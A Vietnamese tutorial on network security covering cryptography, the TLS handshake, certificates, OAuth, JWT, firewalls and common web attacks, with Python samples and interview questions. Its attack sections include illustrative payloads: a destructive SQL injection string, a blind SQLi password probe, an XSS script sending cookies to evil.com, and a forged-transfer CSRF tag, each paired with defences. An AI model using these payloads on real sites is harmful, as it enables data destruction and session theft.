# Network Security — Bảo mật Mạng

---

## Giải thích cho người mới hoàn toàn

Hãy tưởng tượng bạn gửi thư qua bưu điện truyền thống. Ai cũng có thể mở phong bì đọc thư, giả mạo chữ ký, hoặc thay đổi nội dung. Để bảo vệ, bạn cần:

1. **Mã hóa (Encryption)**: Viết thư bằng mật mã mà chỉ người nhận mới giải được — như dùng ngôn ngữ bí mật chỉ hai người biết.

2. **Chữ ký số (Digital Signature)**: Dấu xi của gia đình bạn — người nhận biết thư thật sự từ bạn, không ai giả mạo được.

3. **Certificate**: Giống như chứng minh thư — do cơ quan uy tín (nhà nước) cấp, xác nhận "Người này đúng là Nguyễn Văn An".

**HTTPS** kết hợp cả ba: mã hóa để không ai đọc được, certificate để xác nhận đúng server, chữ ký để đảm bảo dữ liệu không bị sửa đổi dọc đường.

**Hacker** trong mạng giống như kẻ gian đứng giữa bưu điện, cố gắng đọc, sửa, hoặc giả mạo thư của bạn. Các công cụ bảo mật xây "phong bì chống giả mạo" mà kẻ gian không thể phá được.

---

## Giải thích cho người đã biết lập trình (nâng cao)

### Symmetric vs Asymmetric Encryption

**Symmetric Encryption (Mã hóa đối xứng)**:
```
Cùng 1 key để encrypt và decrypt:

plaintext ──[AES key]──► ciphertext ──[AES key]──► plaintext

Ví dụ: AES-256-GCM, ChaCha20-Poly1305

Ưu điểm:
- Rất nhanh: AES-NI hardware instruction
- Phù hợp mã hóa bulk data

Nhược điểm:
- Cần cách trao đổi key an toàn ban đầu (key exchange problem)
- N parties cần N*(N-1)/2 keys
```

**Asymmetric Encryption (Mã hóa bất đối xứng)**:
```
Key pair: Public Key (chia sẻ tự do) + Private Key (giữ bí mật)

Encrypt:  plaintext ──[Public Key]──► ciphertext
Decrypt:  ciphertext ──[Private Key]──► plaintext

Sign:     message ──[Private Key]──► signature
Verify:   signature + message ──[Public Key]──► valid/invalid

Ví dụ: RSA-4096, ECDSA (P-256), Ed25519

Ưu điểm:
- Giải quyết key distribution problem
- Chữ ký số (non-repudiation)

Nhược điểm:
- Chậm hơn symmetric ~1000x
- Không dùng để mã hóa bulk data
```

**Trong thực tế — Hybrid Encryption**:
```
1. Dùng asymmetric để trao đổi symmetric session key an toàn
2. Dùng symmetric key để mã hóa actual data

Đây chính xác là cách TLS hoạt động
```

### AES — Advanced Encryption Standard

```
Thuật toán: AES-256-GCM (recommended)
- Block size: 128 bits
- Key size: 128, 192, hoặc 256 bits
- Mode GCM: Galois/Counter Mode
  - Cung cấp Authenticated Encryption (mã hóa + integrity)
  - Authentication Tag 128-bit: detect tampering
  - IV/Nonce: 96-bit ngẫu nhiên, KHÔNG được reuse

Không dùng:
- AES-ECB: same plaintext block → same ciphertext block (pattern leak)
- AES-CBC mà không có HMAC: padding oracle attack
- AES-CTR mà không authenticate: bit-flip attack
```

### RSA — Rivest-Shamir-Adleman

```
Key generation:
1. Chọn 2 số nguyên tố lớn p, q
2. n = p * q  (modulus, public)
3. φ(n) = (p-1)*(q-1)
4. Chọn e: gcd(e, φ(n)) = 1  (public exponent, thường = 65537)
5. d = e^(-1) mod φ(n)  (private exponent)

Encrypt: c = m^e mod n
Decrypt: m = c^d mod n

Bảo mật dựa trên: khó factorize n = p*q khi p, q đủ lớn
Với RSA-2048: ~10^300 phép tính để factorize

RSA không dùng trực tiếp để encrypt data → dùng để wrap symmetric key
Hoặc dùng OAEP padding: RSA-OAEP
```

### TLS/SSL Handshake Chi tiết

**TLS 1.3 (current, 1-RTT)**:
```
Client                                      Server
  |                                           |
  |  ClientHello                              |
  |  - Supported cipher suites               |
  |  - TLS version: 1.3                      |
  |  - key_share: Client public key (ECDHE)  |
  |  - random: 32 bytes                      |
  |----------------------------------------->|
  |                                           |
  |  ServerHello                              |
  |  - Selected cipher suite                 |
  |  - key_share: Server public key (ECDHE)  |
  |  - random: 32 bytes                      |
  |  {EncryptedExtensions}                   |
  |  {Certificate}                           |
  |  {CertificateVerify}  ← chữ ký server   |
  |  {Finished}           ← HMAC verify      |
  |<------------------------------------------|
  |                                           |
  |  [Verify Certificate]                     |
  |  {Finished}           ← HMAC verify      |
  |  [Application Data] ←─── Bắt đầu ngay   |
  |----------------------------------------->|
  |                                           |
  |  [Application Data]                       |
  |<------------------------------------------|

Key derivation (ECDHE):
- Client tạo ECDHE key pair, gửi public key
- Server tạo ECDHE key pair, gửi public key
- Cả hai tính shared_secret = ECDH(own_private, peer_public)
- Từ shared_secret + randoms → derive traffic keys qua HKDF
```

**Tại sao ECDHE thay vì RSA key exchange?**
- **Forward Secrecy**: Nếu attacker ghi lại traffic hôm nay và sau này lấy được private key → không thể decrypt traffic cũ vì session key đã xóa.
- ECDHE tạo ephemeral key mới cho mỗi session, sau session xóa đi.

### HTTPS Certificate Chain

```
Mozilla/OS Trust Store
├── DigiCert Global Root CA G2 (tự ký, trusted sẵn)
│   └── DigiCert TLS RSA SHA256 2020 CA1 (Intermediate, ký bởi Root)
│       └── *.example.com (Server cert, ký bởi Intermediate)
│           ├── Subject: CN=*.example.com
│           ├── SANs: example.com, www.example.com
│           ├── Valid: 2025-01-01 to 2026-01-01
│           ├── Public Key: RSA 2048-bit
│           └── Issuer Signature: [DigiCert TLS RSA SHA256 2020 CA1]

Verification process:
1. Server gửi cert chain (server cert + intermediate certs)
2. Browser verify server cert chữ ký bởi intermediate CA
3. Browser verify intermediate cert chữ ký bởi root CA
4. Browser kiểm tra root CA có trong trust store không
5. Kiểm tra cert chưa expire và domain match (SAN check)
6. OCSP/CRL check: cert có bị revoke không?

Certificate Transparency (CT):
- Tất cả cert phải được log vào CT log (public, append-only)
- Cert trong CT mới được browsers chấp nhận
- Cho phép detect cert được cấp sai
```

### Common Attacks và Defense

**1. Man-in-the-Middle (MITM)**
```
Normal: Client ←──── HTTPS ────► Server

MITM:   Client ←── HTTP ──► Attacker ←── HTTPS ──► Server
                             (đọc/sửa dữ liệu)

Attack vectors:
- ARP Spoofing trong LAN
- DNS Poisoning → redirect traffic
- Rogue WiFi access point

Defense:
- HSTS (HTTP Strict Transport Security): 
  Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
  → Browser chỉ dùng HTTPS cho domain này, không fallback HTTP
- Certificate Pinning: app verify đúng cert hash cụ thể
- DNSSEC: chống DNS-based MITM
```

**2. SQL Injection**
```sql
-- Vulnerable code (Python):
query = f"SELECT * FROM users WHERE name='{user_input}'"
# user_input = "'; DROP TABLE users; --"
# → "SELECT * FROM users WHERE name=''; DROP TABLE users; --'"

-- Defense: Parameterized queries
cursor.execute("SELECT * FROM users WHERE name = ?", (user_input,))
# Hoặc ORM: User.objects.filter(name=user_input)

-- Blind SQL Injection:
" AND (SELECT 1 FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a') --"
→ Suy ra password từng ký tự qua true/false response
```

**3. Cross-Site Scripting (XSS)**
```
Reflected XSS: URL parameter → inject script
  https://example.com/search?q=<script>document.location='evil.com/steal?c='+document.cookie</script>

Stored XSS: script được lưu vào DB → serve cho mọi user

Defense:
- Content Security Policy (CSP):
  Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com
- HTML encode output: < → &lt;, > → &gt;, " → &quot;
- HttpOnly cookie: JS không đọc được
- Dùng framework tự escape (React, Angular tự escape)
```

**4. Cross-Site Request Forgery (CSRF)**
```
User đăng nhập bank.com → có cookie session

Evil site có:
<img src="https://bank.com/transfer?to=attacker&amount=1000">
→ Browser tự gửi request kèm cookie của bank.com!

Defense:
- CSRF Token: Server generate random token, embed trong form
  <input type="hidden" name="csrf_token" value="abc123random">
  Server verify token khớp trước khi xử lý
- SameSite=Strict/Lax cookie attribute:
  Strict: không gửi cookie khi navigate từ external site
  Lax: chỉ gửi với GET navigation, không gửi với POST từ external
- Double Submit Cookie: token trong cookie và form field phải match
```

**5. DDoS — Distributed Denial of Service**
```
Volumetric:
- UDP Flood: gửi UDP packets lớn đến random ports
- ICMP Flood (Ping Flood)
- Amplification: DNS/NTP/SSDP reflection

Protocol:
- SYN Flood: gửi SYN không ACK → cạn SYN queue
  Defense: SYN Cookies (RFC 4987)
- Connection Exhaustion

Application Layer (Layer 7):
- HTTP Flood: nhiều GET/POST requests
- Slowloris: giữ connection mở với partial HTTP headers
  Defense: request timeout, limit connections per IP

Defense stack:
- CDN/Scrubbing center (Cloudflare, AWS Shield)
- Rate limiting (iptables, nginx limit_req)
- CAPTCHA cho suspicious traffic
- Anycast routing phân tán traffic
```

**6. Replay Attack**
```
Attacker ghi lại request hợp lệ (authentication, transaction)
→ Gửi lại request đó sau

Defense:
- Nonce/Timestamp: mỗi request có timestamp và nonce
  Server từ chối request quá cũ (>5 phút) hoặc nonce đã dùng
- Challenge-response: server gửi random challenge, client ký
- JWT với jti claim + blacklist
- HTTPS (mã hóa thì không replay được qua TLS session)
```

### OAuth 2.0 Flows

**Authorization Code Flow** (Web app, recommended):
```
User                 App                Authorization Server      Resource Server
 |                    |                        |                        |
 | Click "Login"      |                        |                        |
 |─────────────────►  |                        |                        |
 |                    | Redirect to /authorize  |                        |
 |                    |───────────────────────► |                        |
 |                    |  ?client_id=X           |                        |
 |                    |  &redirect_uri=...      |                        |
 |                    |  &scope=read            |                        |
 |                    |  &state=random          |                        |
 |                    |  &code_challenge=PKCE   |                        |
 |                    |                         |                        |
 |     Login page      |                        |                        |
 |◄─────────────────────────────────────────── |                        |
 |   User logs in & consents                   |                        |
 |────────────────────────────────────────────►|                        |
 |                    |                         |                        |
 |                    | Redirect with code       |                        |
 |                    |◄──────────────────────── |                        |
 |                    |  ?code=AUTH_CODE         |                        |
 |                    |  &state=random           |                        |
 |                    |                          |                        |
 |                    | POST /token              |                        |
 |                    |─────────────────────────►|                        |
 |                    |  code=AUTH_CODE          |                        |
 |                    |  code_verifier=PKCE      |                        |
 |                    |                          |                        |
 |                    | access_token + refresh_token                      |
 |                    |◄─────────────────────── |                        |
 |                    |                          |                        |
 |                    | GET /api/data            |                        |
 |                    |  Authorization: Bearer access_token               |
 |                    |─────────────────────────────────────────────────►|
 |                    | data                                              |
 |                    |◄─────────────────────────────────────────────────|
```

**PKCE (Proof Key for Code Exchange)**: Chống authorization code interception attack:
- App tạo `code_verifier` ngẫu nhiên
- `code_challenge = SHA256(code_verifier)` gửi với authorize request
- `code_verifier` gửi khi exchange code for token
- Server verify: `SHA256(code_verifier) == code_challenge`

**Client Credentials Flow** (Server-to-server):
```
Service A  ──POST /token (client_id, client_secret)──►  Auth Server
           ◄──── access_token ────────────────────────
Service A  ──GET /api (Bearer token)──►  Service B (Resource Server)
```

### JWT — JSON Web Token

**Structure**: `header.payload.signature` (base64url encoded, separated by dots)

```json
// Header
{"alg": "HS256", "typ": "JWT"}

// Payload
{
  "sub": "user-123",         // subject (user ID)
  "iss": "https://auth.example.com",  // issuer
  "aud": "https://api.example.com",   // audience
  "iat": 1716897600,         // issued at
  "exp": 1716901200,         // expiration (1 hour later)
  "jti": "abc-def-uuid",     // JWT ID (unique, for replay prevention)
  "roles": ["user", "admin"]
}

// Signature (HMAC-SHA256):
HMAC-SHA256(
  base64url(header) + "." + base64url(payload),
  secret_key
)
```

**Security considerations**:
```python
import jwt  # pip install PyJWT

# Encode
token = jwt.encode(
    payload={"sub": "123", "exp": datetime.utcnow() + timedelta(hours=1)},
    key="secret",
    algorithm="HS256"
)

# Decode với verification
try:
    data = jwt.decode(
        token,
        key="secret",
        algorithms=["HS256"],
        options={
            "verify_exp": True,   # Check expiration
            "verify_aud": True,   # Check audience
        },
        audience="https://api.example.com"
    )
except jwt.ExpiredSignatureError:
    # Token hết hạn
    pass
except jwt.InvalidTokenError:
    # Token không hợp lệ
    pass

# KHÔNG decode mà không verify:
data = jwt.decode(token, options={"verify_signature": False})  # NGUY HIỂM
```

**JWT Pitfalls**:
- `"alg": "none"` attack: set algorithm none để bypass signature check
- Không revoke được dễ dàng (cần blacklist hoặc dùng short-lived token + refresh)
- Payload không mã hóa — đừng để sensitive data

### Firewall — Stateful vs Stateless

```
Stateless Firewall:
- Check từng packet độc lập (src/dst IP, port, protocol)
- Không biết context của connection
- Nhanh hơn, đơn giản hơn
- Dễ bypass: fragment packets, spoof source IP

Stateful Firewall:
- Track connection state (NEW, ESTABLISHED, RELATED, INVALID)
- Biết packet này thuộc connection nào
- Chặn unsolicited inbound packets
- Dùng trong hầu hết modern firewall

iptables (Linux):
# Cho phép traffic đã established/related
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Cho phép SSH từ specific subnet
iptables -A INPUT -p tcp --dport 22 -s 10.0.0.0/8 -j ACCEPT

# Cho phép HTTP và HTTPS từ mọi nơi
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# Drop tất cả INPUT còn lại (default deny)
iptables -A INPUT -j DROP

# Rate limit để chống SYN flood
iptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT
```

### VPN — Virtual Private Network

```
Khái niệm tunneling:
                             Internet
Client ──[Encrypted Tunnel]──── VPN Server ──── Target Server
 10.0.0.5                        10.0.0.1          93.184.216.34

Từ góc nhìn Target Server: traffic đến từ VPN Server IP, không phải Client IP

Các protocol:
1. OpenVPN: TLS-based, port 1194 UDP/TCP, phổ biến
2. WireGuard: UDP, ChaCha20/Poly1305, modern, nhanh, đơn giản
3. IPSec/IKEv2: built-in nhiều OS
4. L2TP/IPSec: cũ hơn

Use cases:
- Remote workers kết nối corporate network
- Bypass geo-restrictions
- Privacy từ ISP (tất cả traffic → VPN server trước)
- Site-to-site VPN: kết nối nhiều văn phòng

Split Tunneling: chỉ corporate traffic qua VPN, traffic khác đi thẳng
Full Tunnel: tất cả traffic qua VPN
```

---

## Định nghĩa chính xác

**TLS (Transport Layer Security)**: Giao thức mật mã học (RFC 8446 cho TLS 1.3) cung cấp confidentiality, integrity, và authentication cho giao tiếp qua mạng. Kế thừa từ SSL (deprecated).

**PKI (Public Key Infrastructure)**: Hệ thống quản lý certificate số, bao gồm Certificate Authorities (CA), certificate lifecycle, và trust model.

**OWASP Top 10**: Danh sách 10 lỗ hổng bảo mật web phổ biến nhất do OWASP (Open Web Application Security Project) công bố, được cập nhật định kỳ.

---

## Bảng / Sơ đồ kỹ thuật

### Symmetric vs Asymmetric Comparison

| Tiêu chí | Symmetric (AES) | Asymmetric (RSA/ECDSA) |
|----------|-----------------|------------------------|
| Keys | 1 key chung | Public/Private key pair |
| Speed | Rất nhanh (GB/s) | Chậm (~KB/s for RSA) |
| Use case | Bulk encryption | Key exchange, digital signature |
| Key distribution | Vấn đề khó | Giải quyết qua public key |
| Key length (secure) | 256-bit AES | RSA 4096-bit, EC P-256 |
| Trong TLS | Encrypt data | Key exchange + cert |

### TLS 1.3 Cipher Suites (Recommended)

| Cipher Suite | Key Exchange | Auth | Encryption | MAC |
|-------------|-------------|------|------------|-----|
| TLS_AES_256_GCM_SHA384 | ECDHE | RSA/ECDSA | AES-256-GCM | SHA384 |
| TLS_CHACHA20_POLY1305_SHA256 | ECDHE | RSA/ECDSA | ChaCha20 | Poly1305 |
| TLS_AES_128_GCM_SHA256 | ECDHE | RSA/ECDSA | AES-128-GCM | SHA256 |

### OWASP Top 10 (2021)

| # | Category | Ví dụ |
|---|---------|-------|
| A01 | Broken Access Control | IDOR, privilege escalation |
| A02 | Cryptographic Failures | Plaintext passwords, weak cipher |
| A03 | Injection | SQL injection, XSS, command injection |
| A04 | Insecure Design | Missing threat modeling |
| A05 | Security Misconfiguration | Default credentials, verbose errors |
| A06 | Vulnerable Components | Outdated libraries (Log4Shell) |
| A07 | Auth Failures | Weak passwords, no MFA |
| A08 | Software Integrity Failures | Unsigned updates, SolarWinds-style |
| A09 | Logging Failures | No audit trail |
| A10 | SSRF | Fetch internal metadata from cloud |

---

## Code mẫu

### Python — AES-256-GCM Encryption

```python
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os
import base64

# pip install cryptography

def encrypt(plaintext: str, key: bytes) -> dict:
    """
    AES-256-GCM authenticated encryption
    Returns: dict với nonce và ciphertext (base64 encoded)
    """
    # CRITICAL: nonce phải ngẫu nhiên và KHÔNG được reuse với cùng key
    nonce = os.urandom(12)  # 96-bit nonce cho GCM
    
    aesgcm = AESGCM(key)
    # additional_data (AAD): không mã hóa nhưng được authenticate
    # Ví dụ: user_id, timestamp — detect nếu bị tamper
    aad = b"additional authenticated data"
    
    ciphertext = aesgcm.encrypt(nonce, plaintext.encode(), aad)
    # ciphertext đã bao gồm 16-byte authentication tag ở cuối
    
    return {
        "nonce": base64.b64encode(nonce).decode(),
        "ciphertext": base64.b64encode(ciphertext).decode(),
        "aad": base64.b64encode(aad).decode()
    }

def decrypt(encrypted: dict, key: bytes) -> str:
    """Decrypt và verify authentication tag"""
    nonce = base64.b64decode(encrypted["nonce"])
    ciphertext = base64.b64decode(encrypted["ciphertext"])
    aad = base64.b64decode(encrypted["aad"])
    
    aesgcm = AESGCM(key)
    try:
        plaintext = aesgcm.decrypt(nonce, ciphertext, aad)
        return plaintext.decode()
    except Exception:
        # InvalidTag: dữ liệu bị tamper hoặc key sai
        raise ValueError("Decryption failed: invalid key or tampered data")

# Demo
key = AESGCM.generate_key(bit_length=256)  # 32 bytes
message = "Secret message: transfer $1000"

encrypted = encrypt(message, key)
print("Encrypted:", encrypted)

decrypted = decrypt(encrypted, key)
print("Decrypted:", decrypted)

# Thử tamper ciphertext
import base64 as b64
tampered = encrypted.copy()
ct_bytes = bytearray(b64.b64decode(tampered["ciphertext"]))
ct_bytes[0] ^= 0xFF  # Flip bits
tampered["ciphertext"] = b64.b64encode(bytes(ct_bytes)).decode()

try:
    decrypt(tampered, key)
except ValueError as e:
    print(f"Tamper detected: {e}")
```

### Python — TLS/HTTPS Client với Certificate Verification

```python
import ssl
import socket
import urllib.request
import certifi  # pip install certifi

def https_request_raw(hostname: str, port: int = 443, path: str = '/'):
    """Raw TLS socket để thấy certificate details"""
    # Tạo SSL context với proper verification
    context = ssl.create_default_context(cafile=certifi.where())
    context.minimum_version = ssl.TLSVersion.TLSv1_2
    # Không dùng: context.check_hostname = False (MITM risk!)
    
    with socket.create_connection((hostname, port), timeout=10) as raw_sock:
        with context.wrap_socket(raw_sock, server_hostname=hostname) as tls_sock:
            # TLS handshake đã xong
            
            # Xem thông tin certificate
            cert = tls_sock.getpeercert()
            print(f"=== Certificate Info ===")
            print(f"Subject: {dict(x[0] for x in cert['subject'])}")
            print(f"Issuer: {dict(x[0] for x in cert['issuer'])}")
            print(f"Valid from: {cert['notBefore']}")
            print(f"Valid until: {cert['notAfter']}")
            print(f"SANs: {cert.get('subjectAltName', [])}")
            
            # TLS version và cipher
            print(f"\nTLS Version: {tls_sock.version()}")
            print(f"Cipher: {tls_sock.cipher()}")
            
            # Gửi HTTP request qua TLS
            request = f"GET {path} HTTP/1.1\r\nHost: {hostname}\r\nConnection: close\r\n\r\n"
            tls_sock.sendall(request.encode())
            
            response = b""
            while True:
                chunk = tls_sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            
            # Chỉ in headers
            headers = response.split(b"\r\n\r\n")[0].decode()
            print(f"\n=== Response Headers ===\n{headers}")


def demonstrate_cert_pinning(hostname: str, expected_cert_hash: str):
    """
    Certificate Pinning: verify đúng cert cụ thể, không chỉ valid cert
    Dùng trong mobile apps để chống rogue CA
    """
    import hashlib
    
    context = ssl.create_default_context()
    
    with socket.create_connection((hostname, 443)) as sock:
        with context.wrap_socket(sock, server_hostname=hostname) as tls_sock:
            der_cert = tls_sock.getpeercert(binary_form=True)
            cert_hash = hashlib.sha256(der_cert).hexdigest()
            
            if cert_hash != expected_cert_hash:
                raise SecurityError(f"Certificate pinning failed!")
            
            print(f"Certificate pin verified: {cert_hash[:16]}...")


if __name__ == '__main__':
    https_request_raw('example.com')
```

### Python — JWT tạo và verify

```python
import jwt
import hmac
import hashlib
import base64
import json
import time
from datetime import datetime, timedelta, timezone

# pip install PyJWT

SECRET_KEY = "super-secret-key-256-bits-minimum-length-for-hs256"
ALGORITHM = "HS256"

def create_access_token(user_id: str, roles: list) -> str:
    """Tạo JWT access token"""
    now = datetime.now(timezone.utc)
    payload = {
        "sub": user_id,           # subject
        "iss": "https://auth.myapp.com",  # issuer
        "aud": "https://api.myapp.com",   # audience
        "iat": now,               # issued at
        "exp": now + timedelta(minutes=15),  # expiry (ngắn!)
        "jti": f"{user_id}-{int(now.timestamp())}",  # JWT ID (unique)
        "roles": roles,
        "token_type": "access"
    }
    return jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)

def verify_token(token: str) -> dict:
    """Verify và decode JWT"""
    try:
        payload = jwt.decode(
            token,
            SECRET_KEY,
            algorithms=[ALGORITHM],
            audience="https://api.myapp.com",
            issuer="https://auth.myapp.com",
            options={
                "verify_exp": True,
                "verify_iat": True,
                "verify_aud": True,
                "verify_iss": True,
            }
        )
        return payload
    except jwt.ExpiredSignatureError:
        raise ValueError("Token has expired")
    except jwt.InvalidAudienceError:
        raise ValueError("Invalid audience")
    except jwt.InvalidIssuerError:
        raise ValueError("Invalid issuer")
    except jwt.InvalidTokenError as e:
        raise ValueError(f"Invalid token: {e}")

# Demo
token = create_access_token("user-123", ["user", "admin"])
print(f"Token: {token[:50]}...")

# Decode (chỉ để xem, KHÔNG dùng trong production mà không verify)
parts = token.split('.')
header = json.loads(base64.b64decode(parts[0] + '=='))
payload_raw = json.loads(base64.b64decode(parts[1] + '=='))
print(f"\nHeader: {json.dumps(header, indent=2)}")
print(f"Payload: {json.dumps(payload_raw, indent=2, default=str)}")

# Verify
try:
    verified = verify_token(token)
    print(f"\nVerified user: {verified['sub']}, roles: {verified['roles']}")
except ValueError as e:
    print(f"Error: {e}")
```

---

## Khi nào dùng / Khi nào KHÔNG dùng

**Dùng HTTPS luôn luôn khi:**
- Bất kỳ production web application nào
- APIs truyền dữ liệu nhạy cảm
- Let's Encrypt cung cấp cert miễn phí — không có lý do để không dùng

**Dùng JWT khi:**
- Stateless authentication cho microservices
- Cross-domain authentication (SSO)
- Short-lived tokens (15 phút access token + 7 ngày refresh token)

**Không dùng JWT khi:**
- Cần immediate revocation (logout không thể revoke JWT ngay)
- Session data lớn (JWT có size limit)
- Thay thế: opaque token + token introspection endpoint

**Dùng OAuth 2.0 khi:**
- Third-party authorization ("Login with Google")
- Cần cấp quyền truy cập có phạm vi hạn chế (scopes)

**Không tự viết crypto khi:**
- Luôn dùng thư viện đã được audit: `cryptography` (Python), `libsodium`, `OpenSSL`
- "Don't roll your own crypto" — lỗi tinh tế trong crypto implementation có thể phá vỡ mọi bảo mật

---

## Lỗi thường gặp (Common Pitfalls)

1. **HTTP thay vì HTTPS**: Mọi production system phải dùng HTTPS. HTTP = plaintext = dữ liệu bị đọc/sửa dọc đường.

2. **Lưu password dạng plaintext hoặc reversible**: Dùng bcrypt/Argon2 để hash password, không AES.

3. **JWT secret key yếu**: `"secret"`, `"password"` là keys quá đơn giản. Dùng ít nhất 256-bit random key.

4. **Không set JWT expiry**: Token không hết hạn → bị đánh cắp thì dùng mãi mãi.

5. **SQL Injection qua f-string**: `f"SELECT * FROM users WHERE id={user_id}"` → luôn dùng parameterized queries.

6. **CORS `Allow-Origin: *` với credentials**: Browsers sẽ chặn — không cho phép wildcard với credentials.

7. **Verbose error messages**: Stack traces, SQL errors, file paths trong response → thông tin cho attacker. Log chi tiết ở server, trả về generic error cho client.

8. **Không validate redirect_uri trong OAuth**: Attacker có thể redirect authorization code đến server của mình.

9. **Dùng MD5/SHA1 cho mật khẩu**: Đã bị crack bởi rainbow tables. Dùng bcrypt, scrypt, Argon2.

10. **Không implement rate limiting**: Login endpoint không có rate limit → brute force attack.

---

## Câu hỏi phỏng vấn hay gặp

1. **Giải thích TLS handshake hoạt động thế nào?**
   - Client gửi ClientHello (cipher suites, key_share). Server trả ServerHello + Certificate + Finished. Client verify cert, tính shared secret từ ECDHE, gửi Finished. Cả hai derive session keys từ shared secret.

2. **Symmetric vs Asymmetric encryption — khi nào dùng cái nào?**
   - Symmetric (AES): nhanh, dùng cho bulk data encryption. Asymmetric (RSA/ECDSA): chậm, dùng để trao đổi key và chữ ký số. TLS dùng hybrid: asymmetric để trao đổi key, sau đó symmetric.

3. **Forward Secrecy là gì? Tại sao quan trọng?**
   - Mỗi session dùng ephemeral key pair mới. Ngay cả khi private key server bị lộ sau này, attacker không thể decrypt traffic đã ghi trước đó. ECDHE trong TLS 1.3 cung cấp forward secrecy.

4. **Sự khác biệt giữa authentication và authorization?**
   - Authentication (authn): xác nhận "Bạn là ai?" (login, verify identity). Authorization (authz): xác nhận "Bạn được làm gì?" (permissions, access control).

5. **Giải thích CSRF attack và cách phòng.**
   - CSRF: attacker trick browser của victim gửi request đến site victim đã authenticated. Phòng: CSRF token (verify per-request random token), SameSite cookie, verify Origin/Referer header.

6. **JWT có thể bị tấn công thế nào?**
   - `alg: none` attack (verify signature bị bypass). Weak secret (brute force). Không verify exp → expired token dùng được. Sensitive data trong payload (không mã hóa, chỉ encode base64). Missing audience/issuer validation.

7. **OAuth 2.0 Authorization Code flow với PKCE là gì?**
   - PKCE (Proof Key for Code Exchange) chống authorization code interception. Client tạo code_verifier, gửi SHA256 hash (code_challenge) với request. Khi exchange code for token, gửi code_verifier để verify.

8. **Tại sao không nên lưu JWT trong localStorage?**
   - XSS có thể đọc localStorage và đánh cắp token. Nên dùng HttpOnly cookie: JS không đọc được, browser tự gửi kèm request. Nhưng cookie cần CSRF protection. Trade-off: localStorage đơn giản hơn, HttpOnly cookie an toàn hơn với XSS.
